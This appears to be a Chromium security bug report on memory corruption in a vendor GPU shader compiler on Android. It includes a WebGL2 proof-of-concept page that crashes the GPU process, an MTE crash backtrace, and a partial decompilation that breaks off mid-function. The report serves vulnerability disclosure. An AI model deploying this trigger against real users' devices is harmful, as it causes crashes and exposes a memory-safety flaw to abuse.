# memory corruption in glsl::glslTypeGen::GetConstantByType leads to Android gpu crash

| Field | Value |
|-------|-------|
| **Issue ID** | [485945891](https://issues.chromium.org/issues/485945891) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Internals>GPU>Internals |
| **Platforms** | Android |
| **Reporter** | ha...@gmail.com |
| **Assignee** | ge...@chromium.org |
| **Created** | 2026-02-20 |
| **Bounty** | $32,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

VULNERABILITY DETAILS
The cause of this vulnerability is likely an optimization flaw.

VERSION Chrome Version: [147.0.7686.9 build. and 145.0.7632.109 stable]

Operating System: [pixel 10 Build/BP4A.260205.001]

REPRODUCTION CASE

1.open poc.html

```
<!DOCTYPE html>
<html>
<body>
    <button id="runBtn">run test</button>
    <div id="log">see logcat</div>

    <script>
        document.getElementById('runBtn').onclick = () => {
            const gl = document.createElement('canvas').getContext('webgl2');
            const log = document.getElementById('log');
            let src = `#version 300 es
            precision highp float;
            struct S { float a; float b; };
            struct T { S s[2]; };
            struct U { T t[2]; };
            out vec4 color;
            void main() {
                U u = U(T[2](T(S[2](S(1.0, 2.0), S(3.0, 4.0))), T(S[2](S(5.0, 6.0), S(7.0, 8.0)))));
                float v = 0.0;
            `;

            for (let i = 0; i < 150; i++) {
                let idx1 = i % 2;
                let idx2 = (i + 1) % 2;
                src += `v += u.t[${idx1}].s[${idx2}].a + u.t[${idx2}].s[${idx1}].b;\n`;
            }

            src += "color = vec4(v);\n}";

            const shader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(shader, src);
            
            log.innerText = "trigger...";
            
            gl.compileShader(shader);
            
            const prog = gl.createProgram();
            gl.attachShader(prog, shader);
            gl.linkProgram(prog);
            
            gl.getProgramParameter(prog, gl.LINK_STATUS);
        };
    </script>
</body>
</html>

```

2.crash

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

```

02-20 10:55:39.575 19476 19476 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
02-20 10:55:39.575 19476 19476 F DEBUG   : Build fingerprint: 'google/frankel/frankel:16/BP4A.260205.001/14624666:user/release-keys'
02-20 10:55:39.575 19476 19476 F DEBUG   : Kernel Release: '6.6.98-android15-8-g4b48560cd07d-ab14239520-4k'
02-20 10:55:39.575 19476 19476 F DEBUG   : Revision: 'MP1.0'
02-20 10:55:39.575 19476 19476 F DEBUG   : ABI: 'arm64'
02-20 10:55:39.575 19476 19476 F DEBUG   : Timestamp: 2026-02-20 10:55:39.417630045+0800
02-20 10:55:39.575 19476 19476 F DEBUG   : Process uptime: 5s
02-20 10:55:39.575 19476 19476 F DEBUG   : Executable: /system/bin/app_process64
02-20 10:55:39.576 19476 19476 F DEBUG   : Cmdline: org.chromium.chrome:privileged_process0
02-20 10:55:39.576 19476 19476 F DEBUG   : pid: 19414, tid: 19441, name: CrGpuMain  >>> org.chromium.chrome:privileged_process0 <<<
02-20 10:55:39.576 19476 19476 F DEBUG   : uid: 10327
02-20 10:55:39.576 19476 19476 F DEBUG   : tagged_addr_ctrl: 000000000007fff3 (PR_TAGGED_ADDR_ENABLE, PR_MTE_TCF_SYNC, mask 0xfffe)
02-20 10:55:39.576 19476 19476 F DEBUG   : pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
02-20 10:55:39.576 19476 19476 F DEBUG   : esr: 0000000092000011 (Data Abort Exception 0x24)
02-20 10:55:39.576 19476 19476 F DEBUG   : signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x0000007ae8178120 (read)
02-20 10:55:39.576 19476 19476 F DEBUG   :     x0  0000000000000000  x1  0000000010000011  x2  0800007b7815d5b0  x3  0300007ae8178110
02-20 10:55:39.576 19476 19476 F DEBUG   :     x4  0000000000000004  x5  0000000000000000  x6  0000000000000850  x7  0000000000000000
02-20 10:55:39.576 19476 19476 F DEBUG   :     x8  0300007ae8178110  x9  0000000000000002  x10 0000000000000030  x11 0000000000000001
02-20 10:55:39.576 19476 19476 F DEBUG   :     x12 0000000000000004  x13 00000000b7221c5b  x14 000000000000003f  x15 ffffffffffffffff
02-20 10:55:39.576 19476 19476 F DEBUG   :     x16 0000007c483441a0  x17 0000007c482ccb90  x18 000000786fd24000  x19 0000000000000000
02-20 10:55:39.576 19476 19476 F DEBUG   :     x20 0000000000000000  x21 0800007b7815d5b0  x22 0800007b281b0158  x23 0000000010000011
02-20 10:55:39.576 19476 19476 F DEBUG   :     x24 0000000000000000  x25 0000000000000004  x26 000000794b7ba010  x27 0800007b7815d5b0
02-20 10:55:39.576 19476 19476 F DEBUG   :     x28 0600007ae8198110  x29 00000078714d6aa0
02-20 10:55:39.576 19476 19476 F DEBUG   :     lr  002d8e794bfe111c  sp  00000078714d6900  pc  000000794bfe14b0  pst 0000000060001000
02-20 10:55:39.576 19476 19476 F DEBUG   :     esr 0000000092000011
02-20 10:55:39.576 19476 19476 F DEBUG   : 61 total frames
02-20 10:55:39.576 19476 19476 F DEBUG   : backtrace:
02-20 10:55:39.576 19476 19476 F DEBUG   :       #00 pc 0000000000d394b0  /vendor/lib64/libufwriter.so (glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+2624) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #01 pc 0000000000d39118  /vendor/lib64/libufwriter.so (glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+1704) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #02 pc 0000000000d39648  /vendor/lib64/libufwriter.so (glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #03 pc 0000000000d39118  /vendor/lib64/libufwriter.so (glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+1704) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #04 pc 0000000000d39648  /vendor/lib64/libufwriter.so (glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #05 pc 0000000000d39118  /vendor/lib64/libufwriter.so (glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+1704) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #06 pc 0000000000d0d060  /vendor/lib64/libufwriter.so (glsl::glslValue::GetValueRefForTemporary(unsigned int, GLSLIdentifierDataTAG const*, GLSLBuiltInVariableIDTAG, bool, bool)+176) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #07 pc 0000000000d0dcd4  /vendor/lib64/libufwriter.so (glsl::glslValue::GetLLVMValueRefFromNode(unsigned int, bool)+1092) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #08 pc 0000000000d10638  /vendor/lib64/libufwriter.so (glsl::glslValue::EvaluateNodeAsReference(GLSLNodeTAG const*, bool)+168) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #09 pc 0000000000cfc788  /vendor/lib64/libufwriter.so (glsl::glslModule::ProcessNodeEQUAL(GLSLNodeTAG const*, bool)+552) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #10 pc 0000000000d05c98  /vendor/lib64/libufwriter.so (glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #11 pc 0000000000d015bc  /vendor/lib64/libufwriter.so (glsl::glslModule::ProcessNodeExpression(GLSLNodeTAG const*, bool)+60) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #12 pc 0000000000d05a54  /vendor/lib64/libufwriter.so (glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2452) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #13 pc 0000000000d0fd94  /vendor/lib64/libufwriter.so (glsl::glslValue::EvaluateNodeAsValue(GLSLNodeTAG const*, bool)+148) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #14 pc 0000000000d02730  /vendor/lib64/libufwriter.so (glsl::glslModule::ProcessNodeDeclaration(GLSLNodeTAG const*)+64) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #15 pc 0000000000d009c8  /vendor/lib64/libufwriter.so (glsl::glslModule::ICTraverseASTAndAddToLLVM(GLSLNodeTAG const*)+280) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #16 pc 0000000000d035ec  /vendor/lib64/libufwriter.so (glsl::glslModule::AddNodeSHADER(GLSLNodeTAG const*)+3708) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #17 pc 0000000000d05ea0  /vendor/lib64/libufwriter.so (glsl::glslModule::TranslateASTreeToLLVMIR(GLSLTreeContextTAG const*)+336) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #18 pc 0000000000d47214  /vendor/lib64/libufwriter.so (GenerateICodeProgram+2052) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #19 pc 0000000000c93d64  /vendor/lib64/libufwriter.so (GLSLCompileToIntermediateCode+1220) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #20 pc 0000000000c94218  /vendor/lib64/libufwriter.so (GLSLCompileToUniflex+776) (BuildId: 3669c3a3441cf03574357745e0fc3241)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #21 pc 0000000000121244  /vendor/lib64/egl/libGLESv2_powervr.so (DoCompileShader(GLES3Context_TAG*, GLES3DeferredShaderCompileContextRec*, GLES3CompilerAppHintSetupRec const*, GLSLProgramTypeTAG, char const*, GLSLIntermediateTAG const*, GLES3RecompiledShaderConditionRec*, GLES3CompiledShaderStateRec*, unsigned int, GLES3ShaderRec*) (.__uniq.240097599076884967950137398077872991440)+644) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #22 pc 000000000011fa9c  /vendor/lib64/egl/libGLESv2_powervr.so (CompileShader+252) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #23 pc 000000000011aa24  /vendor/lib64/egl/libGLESv2_powervr.so (glCompileShader+100) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #24 pc 00000000034161bc  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #25 pc 0000000003343160  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #26 pc 000000000823c644  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #27 pc 00000000032e56f4  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #28 pc 0000000003341994  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #29 pc 00000000082804ac  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #30 pc 0000000008f0bfd0  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #31 pc 0000000008f0375c  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #32 pc 0000000003c808a8  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #33 pc 0000000008fc440c  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #34 pc 0000000008fc4150  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #35 pc 0000000008fc99e0  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #36 pc 0000000008fcc608  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #37 pc 000000000384e7a0  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #38 pc 0000000003c85bd0  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #39 pc 0000000003c853d0  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #40 pc 0000000006668868  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #41 pc 0000000006682978  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #42 pc 0000000006682594  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #43 pc 000000000661ef8c  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #44 pc 0000000006682f90  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #45 pc 0000000006649c9c  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #46 pc 000000000bf74a80  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #47 pc 00000000065fa400  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #48 pc 00000000065fb264  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #49 pc 00000000065f8e20  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #50 pc 00000000065f9d94  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/lib/arm64/libchrome.so (BuildId: e80387ba88bb64b6c4f83760097f3d5247fcfdba)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #51 pc 0000000000d464ec  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (art_jni_trampoline+108)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #52 pc 00000000006683e8  /apex/com.android.art/lib64/libart.so (nterp_helper+152) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #53 pc 0000000000288720  /data/app/~~1kKbzw01xOz6SGcOfBHcEg==/org.chromium.chrome-txCbTxo6OoHX2I2sgIwOrA==/base.apk (offset 0x1ec6000) (nf1.run+560)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #54 pc 000000000031d5f0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (java.lang.Thread.run+64)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #55 pc 00000000002aaf94  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #56 pc 00000000002709b0  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+220) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #57 pc 00000000004bdfc8  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1184) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #58 pc 00000000004bdb18  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #59 pc 000000000008a314  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
02-20 10:55:39.576 19476 19476 F DEBUG   :       #60 pc 000000000007b1f4  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
02-20 10:55:39.576 19476 19476 F DEBUG   : Learn more about MTE reports: https://source.android.com/docs/security/test/memory-safety/mte-reports


```

## Timeline

### ha...@gmail.com (2026-02-20)

```

/* glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)
    */

undefined8 __thiscall
glsl::glslTypeGen::GetConstantByType
          (glslTypeGen *this,uint param_1,Type *param_2,void *param_3,uint param_4,bool param_5)

{
  undefined4 *puVar1;
  Type TVar2;
  long lVar3;
  int iVar4;
  undefined4 uVar5;
  undefined8 uVar6;
  void *pvVar7;
  __tree_node_base *p_Var8;
  int iVar9;
  undefined8 *puVar10;
  long *plVar11;
  __tree_node_base *p_Var12;
  uint *puVar13;
  ConstantVector *pCVar14;
  undefined8 *puVar15;
  long *plVar16;
  long lVar17;
  ConstantVector *pCVar18;
  long *plVar19;
  uint *puVar20;
  __tree_node_base *p_Var21;
  ulong uVar22;
  uint *__src;
  uint *puVar23;
  uint uVar24;
  ulong uVar25;
  uint uVar26;
  ulong uVar27;
  long lVar28;
  StructType *pSVar29;
  ulong uVar30;
  ulong uVar31;
  ulong uVar32;
  __tree_node_base *p_Var33;
  size_t sVar34;
  Type *pTVar35;
  double dVar36;
  undefined1 auVar37 [32];
  undefined1 auVar38 [16];
  undefined1 auStack_1f0 [400];
  
  lVar3 = SVE_addvl(auStack_1f0,auStack_1f0,0xff);
  TVar2 = param_2[8];
  uVar27 = (ulong)param_4;
  uVar6 = 0;
  *(void **)(lVar3 + 0x50) = param_3;
  if ((byte)TVar2 < 0xf) {
    if (2 < (byte)TVar2) {
      if (TVar2 != (Type)0x3) {
        if (TVar2 == (Type)0xd) {
LAB_00e38e6c:
          iVar9 = *(int *)(*(long *)(lVar3 + 0x50) + uVar27 * 4);
          iVar4 = -(uint)(iVar9 != 0);
          if (!param_5) {
            iVar4 = iVar9;
          }
          SVE_addvl(lVar3,lVar3,1);
          uVar6 = llvm::ConstantInt::get(param_2,(long)iVar4,true);
          return uVar6;
        }
        goto LAB_00e397e0;
      }
LAB_00e39330:
      dVar36 = *(double *)(*(long *)(lVar3 + 0x50) + uVar27 * 8);
      goto LAB_00e394b8;
    }
    if ((TVar2 != (Type)0x0) && (TVar2 != (Type)0x2)) goto LAB_00e397e0;
LAB_00e394ac:
    dVar36 = (double)*(float *)(*(long *)(lVar3 + 0x50) + uVar27 * 4);
LAB_00e394b8:
    SVE_addvl(lVar3,lVar3,1);
    uVar6 = llvm::ConstantFP::get(param_2,dVar36);
    return uVar6;
  }
  if ((byte)TVar2 < 0x11) {
    if (TVar2 == (Type)0xf) {
      do {
        param_2 = (Type *)**(undefined8 **)(param_2 + 0x10);
        TVar2 = param_2[8];
      } while (TVar2 == (Type)0xf);
      if ((byte)TVar2 < 0xd) {
        if ((TVar2 == (Type)0x0) || (TVar2 == (Type)0x2)) {
          uVar27 = 0;
          goto LAB_00e394ac;
        }
        if (TVar2 == (Type)0x3) {
          uVar27 = 0;
          goto LAB_00e39330;
        }
      }
      else if ((byte)TVar2 < 0x11) {
        if (TVar2 == (Type)0xd) {
          uVar27 = 0;
          goto LAB_00e38e6c;
        }
        if (TVar2 == (Type)0x10) {
          uVar27 = 0;
          goto LAB_00e38af4;
        }
      }
      else {
        if (TVar2 == (Type)0x11) {
          uVar27 = 0;
          goto LAB_00e394f0;
        }
        if (TVar2 == (Type)0x12) {
          uVar27 = 0;
          goto LAB_00e38ec8;
        }
      }
      uVar6 = 0;
      goto LAB_00e397e0;
    }
    if (TVar2 != (Type)0x10) goto LAB_00e397e0;
LAB_00e38af4:
    *(undefined8 *)(lVar3 + 0x118) = 0;
    *(undefined8 *)(lVar3 + 0x110) = 0;
    *(undefined8 *)(lVar3 + 0x128) = 0;
    *(undefined8 *)(lVar3 + 0x120) = 0;
    *(undefined8 *)(lVar3 + 0x138) = 0;
    *(undefined8 *)(lVar3 + 0x130) = 0;
    *(undefined8 *)(lVar3 + 0x148) = 0;
    *(undefined8 *)(lVar3 + 0x140) = 0;
    *(undefined8 *)(lVar3 + 0x158) = 0;
    *(undefined8 *)(lVar3 + 0x150) = 0;
    *(undefined8 *)(lVar3 + 0x168) = 0;
    *(undefined8 *)(lVar3 + 0x160) = 0;
    *(undefined8 *)(lVar3 + 0x178) = 0;
    *(undefined8 *)(lVar3 + 0x170) = 0;
    *(undefined8 *)(lVar3 + 0x188) = 0;
    *(undefined8 *)(lVar3 + 0x180) = 0;
    auVar37 = SVE_index(ZEXT1632(ZEXT816(0)),0,0x10);
    *(long *)(lVar3 + 0x108) = auVar37._0_8_;
    uVar24 = *(uint *)(param_2 + 0xc);
    uVar32 = (ulong)uVar24;
    *(long *)(lVar3 + 8) = lVar3 + 0x110;
    *(long *)(lVar3 + 0x100) = lVar3 + 0x110;
    if (param_1 == 0) {
      if (uVar24 != 0) {
        lVar17 = 0;
        do {
          pSVar29 = *(StructType **)(*(long *)(param_2 + 0x10) + lVar17);
          if ((pSVar29 == (StructType *)0x0) || ((*(uint *)(pSVar29 + 8) & 0x4ff) != 0x10)) {
LAB_00e39390:
            uVar6 = GetConstantByType(this,0,(Type *)pSVar29,*(void **)(lVar3 + 0x50),(uint)uVar27,
                                      param_5);
            uVar25 = (ulong)*(uint *)(lVar3 + 0x108);
            if (*(uint *)(lVar3 + 0x10c) <= uVar25) {
              llvm::SmallVectorBase<>::grow_pod
                        ((SmallVectorBase<> *)(lVar3 + 0x100),*(void **)(lVar3 + 8),uVar25 + 1,8);
              uVar25 = (ulong)*(uint *)(lVar3 + 0x108);
            }
            *(undefined8 *)(*(long *)(lVar3 + 0x100) + uVar25 * 8) = uVar6;
            *(int *)(lVar3 + 0x108) = *(int *)(lVar3 + 0x108) + 1;
            iVar4 = (anonymous_namespace)::GetNumberOfElementsInTypeWithoutPadding((Type *)pSVar29);
            uVar27 = (ulong)(iVar4 + (uint)uVar27);
          }
          else {
            auVar38 = llvm::StructType::getName(pSVar29);
            if ((auVar38._8_8_ < 2) || (*auVar38._0_8_ != 0x6470)) goto LAB_00e39390;
            uVar6 = llvm::UndefValue::get((Type *)pSVar29);
            uVar25 = (ulong)*(uint *)(lVar3 + 0x108);
            if (*(uint *)(lVar3 + 0x10c) <= uVar25) {
              llvm::SmallVectorBase<>::grow_pod
                        ((SmallVectorBase<> *)(lVar3 + 0x100),*(void **)(lVar3 + 8),uVar25 + 1,8);
              uVar25 = (ulong)*(uint *)(lVar3 + 0x108);
            }
            *(undefined8 *)(*(long *)(lVar3 + 0x100) + uVar25 * 8) = uVar6;
            *(int *)(lVar3 + 0x108) = *(int *)(lVar3 + 0x108) + 1;
          }
          lVar17 = lVar17 + 8;
        } while (uVar32 * 8 - lVar17 != 0);
      }
    }
    else {
      *(Type **)(lVar3 + 0x40) = param_2;
      *(undefined8 *)(lVar3 + 0x78) = 0;
      *(undefined8 *)(lVar3 + 0x80) = 0;
      *(undefined8 *)(lVar3 + 0x68) = 0;
      *(long *)(lVar3 + 0x70) = lVar3 + 0x78;
      *(long *)(lVar3 + 0x30) = lVar3 + 0x78;
      *(long *)(lVar3 + 0x58) = lVar3 + 0x60;
      *(undefined8 *)(lVar3 + 0x60) = 0;
      *(long *)(lVar3 + 0x20) = lVar3 + 0x60;
      if (uVar24 != 0) {
        uVar25 = 0;
        uVar22 = 0;
        *(undefined8 *)(lVar3 + 0x48) = 0;
        *(glslTypeGen **)(lVar3 + 0x10) = this + 8;
        *(ulong *)(lVar3 + 0x18) = uVar32;
        puVar20 = (uint *)0x0;
        __src = (uint *)0x0;
        do {
